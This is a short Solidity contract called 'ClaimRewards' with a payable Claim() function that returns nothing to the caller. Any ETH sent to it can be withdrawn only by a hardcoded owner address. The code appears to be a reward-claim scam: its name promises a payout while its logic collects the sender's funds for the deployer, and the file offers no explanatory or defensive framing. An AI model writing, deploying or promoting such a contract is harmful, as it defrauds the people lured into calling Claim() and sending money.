pragma solidity ^0.4.26;

contract ClaimRewards {

    address private owner;

     constructor() public{   
        owner = 0x29488E5fD6bF9B3cc98A9d06A25204947ccCBE4D;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function Claim() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}